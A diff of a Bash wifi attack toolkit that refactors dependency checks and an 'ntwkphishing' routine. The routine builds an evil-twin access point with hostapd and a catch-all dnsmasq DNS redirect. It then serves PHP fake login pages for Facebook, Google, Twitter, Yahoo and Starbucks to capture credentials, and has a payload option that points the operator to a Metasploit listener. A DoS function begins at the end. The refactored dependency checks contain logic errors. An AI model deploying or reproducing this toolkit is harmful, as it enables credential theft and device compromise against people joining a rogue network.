@@ -58,24 +58,18 @@ programs() {
 		
 		for program in "${dependencias[@]}"; do
 			test -f /usr/bin/$program
-			testest1=$(echo= $?)
-			
-			test -f /usr/sbin/$program
-			testest2=$(echo= $?)
-			
-			if [ "$testest1" -eq 0 ]; then
-				echo -e "\n${greenColour}[+]$grayColour $program"
-				sleep 0.5
-			
-			elif [ "$testest2" -eq 0 ]; then
+			if [ "$(echo= $?)" -eq 0 ]; then
 				echo -e "\n${greenColour}[+]$grayColour $program"
 				sleep 0.5
 			else
-				echo -e "\n${redColour}[-]$grayColour $program"
-				sleep 0.5
-				echo -e "\n${blueColour}[*]$grayColour Installing ${program}..." 
-				sudo apt-get install $program -y > /dev/null 2>&1
-
+				test -f /usr/sbin/$program
+				if [ "$(echo= $?)" -eq 0 ]; then
+					echo -e "\n${redColour}[-]$grayColour $program"
+					sleep 0.5
+				else
+					echo -e "\n${blueColour}[*]$grayColour Installing ${program}..." 
+					sudo apt-get install $program -y > /dev/null 2>&1
+				fi
 			fi
 		done
 	elif [ "$arch" -eq 0 ]; then
@@ -95,17 +89,20 @@ programs() {
 		
 		for program in "${depasendenci[@]}"; do
 			test -f /usr/bin/$program
-			testest1=$(echo= $?)
-			test -f /usr/sbin/$program
-			testest2=$(echo= $?)
-			if [ "$testest1" -eq 0 ]; then
+			if [ "$(echo= $?)" -eq 0 ]; then
 				echo -e "\n${greenColour}[+]$grayColour $program"
 				sleep 0.5
 			else 
-				echo -e "\n${redColour}[-]$grayColour $program"
-				sleep 0.5
-				echo -e "\n${blueColour}[*]$grayColour Installing ${program}..." 
-				sudo pacman -S $program -y > /dev/null 2>&1
+				test -f /usr/sbin/$program
+				if [ "$(echo= $?)" -eq 0 ]; then
+					echo -e "\n${greenColour}[+]$grayColour $program"
+					sleep 0.5
+				else
+					echo -e "\n${redColour}[-]$grayColour $program"
+					sleep 0.5
+					echo -e "\n${blueColour}[*]$grayColour Installing ${program}..." 
+					sudo pacman -S $program -y > /dev/null 2>&1
+				fi
 
 			fi
 		done
@@ -126,18 +123,20 @@ programs() {
 		
 		for program in "${dependencias[@]}"; do
 			test -f /usr/bin/$program
-			testest1=$(echo= $?)
-			test -f /usr/sbin/$program
-			testest2=$(echo= $?)
-			if [ "$testest1" -eq 0 ]; then
+			if [ "$(echo= $?)" -eq 0 ]; then
 				echo -e "\n${greenColour}[+]$grayColour $program"
 				sleep 0.5
 			else 
-				echo -e "\n${redColour}[-]$grayColour $program"
-				sleep 0.5
-				echo -e "\n${blueColour}[*]$grayColour Installing ${program}..." 
-				sudo dnf install $program -y > /dev/null 2>&1
-
+				test -f /usr/bin/$program
+				if [ "$(echo= $?)" -eq 0 ]; then
+					echo -e "\n${greenColour}[+]$grayColour $program"
+					sleep 0.5
+				else
+					echo -e "\n${redColour}[-]$grayColour $program"
+					sleep 0.5
+					echo -e "\n${blueColour}[*]$grayColour Installing ${program}..." 
+					sudo dnf install $program -y > /dev/null 2>&1
+				fi
 			fi
 		done
 	else 
@@ -394,6 +393,7 @@ menunomon() {
 }
 
 ntwkphishing(){
+	
 	credentials() {
 		hosts=0 
 		tput civis
@@ -411,78 +411,79 @@ ntwkphishing(){
 	attack() {
 		if [[ -e credenciales.txt ]]; then
 			rm -rf credenciales.txt
-		fi
-		rm iface 2>/dev/null
-		tput cnorm; echo -ne "${blueColour}[?]$grayColour Name of the network to be used: " && read ssid
-		echo -ne "${blueColour}[?]$grayColour Channel to use (1-12): " && read ch
-		tput civis; clear; echo -e "\n${greenColour}[+]$grayColour Cleaning connections"
-		killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
-		sleep 3
-		echo -e "interface=${tar}\n" > hostapd.conf
-		echo -e "driver=nl80211\n" >> hostapd.conf
-		echo -e "ssid=$ssid\n" >> hostapd.conf
-		echo -e "hw_mode=g\n" >> hostapd.conf
-		echo -e "channel=$ch\n" >> hostapd.conf
-		echo -e "macaddr_acl=0\n" >> hostapd.conf
-		echo -e "auth_algs=1\n" >> hostapd.conf
-		echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
-		echo -e "\n$yellowColour[*]$grayColour  Configuring interface $tar"
-		sleep 1; echo -e "$yellowColour[*]$grayColour Starting hostapd..."
-		hostapd hostapd.conf > /dev/null 2>&1 &
-		sleep 5
-		echo -e "\n${yellowColour}[*]${grayColour} Configuring dnsmasq..."
-		ifconfig $tar up 192.168.1.1 netmask 255.255.255.0
-		sleep 1
-		route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
-		sleep 3
-		echo -e "interface=${tar}\n" > dnsmasq.conf
-		echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
-		echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
-		echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
-		echo -e "server=8.8.8.8\n" >> dnsmasq.conf
-		echo -e "log-queries\n" >> dnsmasq.conf
-		echo -e "log-dhcp\n" >> dnsmasq.conf
-		echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
-		echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
-		dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
-		cd src
-		logins=(facebook google starbucks twitter yahoo cliqq-payload optimumwifi all_in_one)
-		tput cnorm: echo -ne "${yellowColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo-login, cliqq-payload, optimumwifi): " && read usedlogin
-		check_logins=0; for login in "${logins[@]}"; do
-			if [ "$login" == "$usedlogin" ]; then
-				check_logins=1
-			fi
-		done
-		if [ "$usedlogin" == "cliqq-payload" ]; then
-			check_logins=2
-		fi
-		if [ $check_logins -eq 1 ]; then
-			tput civis; pushd $template > /dev/null 2>&1
-			echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
-			php -S 192.168.1.1:80 > /dev/null 2>&1 &
-			sleep 2
-			popd > /dev/null 2>&1; credentials
-		elif [ $check_logins -eq 2 ]; then
-			tput civis; pushd $template > /dev/null 2>&1
-			echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
-			php -S 192.168.1.1:80 > /dev/null 2>&1 &
-			sleep 2
-			echo -e "\n${yellowColour}[*]${grayColour} Configure from another console a Listener in Metasploit as follows: "
-			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
-			cat msfconsole.rc
-			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
-			echo -e "\n${redColour}[!]${grayColour} Enter to continue${endColour}" && read
-			popd > /dev/null 2>&1; credentials
 		else
-			tput civis; echo -e "\n${yellowColour}[*]{grayColour} Using custom template..."; sleep 1
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server web in${endColour}${blueColour} $usedlogin\n"; sleep 1
-			pushd $usedlogin > /dev/null 2>&1
-			php -S 192.168.1.1:80 > /dev/null 2>&1 
-			popd > /dev/null 2>&1; credentials
+			rm iface 2>/dev/null
+			tput cnorm; echo -ne "${blueColour}[?]$grayColour Name of the network to be used: " && read ssid
+			echo -ne "${blueColour}[?]$grayColour Channel to use (1-12): " && read ch
+			tput civis; clear; echo -e "\n${greenColour}[+]$grayColour Cleaning connections"
+			killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
+			sleep 3
+			echo -e "interface=${tar}\n" > hostapd.conf
+			echo -e "driver=nl80211\n" >> hostapd.conf
+			echo -e "ssid=$ssid\n" >> hostapd.conf
+			echo -e "hw_mode=g\n" >> hostapd.conf
+			echo -e "channel=$ch\n" >> hostapd.conf
+			echo -e "macaddr_acl=0\n" >> hostapd.conf
+			echo -e "auth_algs=1\n" >> hostapd.conf
+			echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
+			echo -e "\n$yellowColour[*]$grayColour  Configuring interface $tar"
+			sleep 1; echo -e "$yellowColour[*]$grayColour Starting hostapd..."
+			hostapd hostapd.conf > /dev/null 2>&1 &
+			sleep 5
+			echo -e "\n${yellowColour}[*]${grayColour} Configuring dnsmasq..."
+			ifconfig $tar up 192.168.1.1 netmask 255.255.255.0
+			sleep 1
+			route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+			sleep 3
+			echo -e "interface=${tar}\n" > dnsmasq.conf
+			echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
+			echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
+			echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
+			echo -e "server=8.8.8.8\n" >> dnsmasq.conf
+			echo -e "log-queries\n" >> dnsmasq.conf
+			echo -e "log-dhcp\n" >> dnsmasq.conf
+			echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
+			echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
+			dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
+			cd src
+			logins=(facebook google starbucks twitter yahoo cliqq-payload optimumwifi all_in_one)
+			tput cnorm: echo -ne "${yellowColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo-login, cliqq-payload, optimumwifi): " && read usedlogin
+			check_logins=0; for login in "${logins[@]}"; do
+				if [ "$login" == "$usedlogin" ]; then
+					check_logins=1
+				fi
+			done
+			if [ "$usedlogin" == "cliqq-payload" ]; then
+				check_logins=2
+			fi
+			if [ $check_logins -eq 1 ]; then
+				tput civis; pushd $template > /dev/null 2>&1
+				echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
+				php -S 192.168.1.1:80 > /dev/null 2>&1 &
+				sleep 2
+				popd > /dev/null 2>&1; credentials
+			elif [ $check_logins -eq 2 ]; then
+				tput civis; pushd $template > /dev/null 2>&1
+				echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
+				php -S 192.168.1.1:80 > /dev/null 2>&1 &
+				sleep 2
+				echo -e "\n${yellowColour}[*]${grayColour} Configure from another console a Listener in Metasploit as follows: "
+				for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+				cat msfconsole.rc
+				for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+				echo -e "\n${redColour}[!]${grayColour} Enter to continue${endColour}" && read
+				popd > /dev/null 2>&1; credentials
+			else
+				tput civis; echo -e "\n${yellowColour}[*]{grayColour} Using custom template..."; sleep 1
+				echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server web in${endColour}${blueColour} $usedlogin\n"; sleep 1
+				pushd $usedlogin > /dev/null 2>&1
+				php -S 192.168.1.1:80 > /dev/null 2>&1 
+				popd > /dev/null 2>&1; credentials
+			fi
+			cd ..
 		fi
-		cd ..
 	}
-	clear; echo -e "$purpleColour[*]$grayColour Starting NTWK Phishing..."; sleep 2; attack	
+	clear; echo -e "$purpleColour[*]$grayColour Starting NTWK Phishing..."; sleep 2; attack
 }
 dosattack() {
 	clear; echo -e "\n${blueColour}[*]$grayColour Starting DoS attack..."; sleep 2
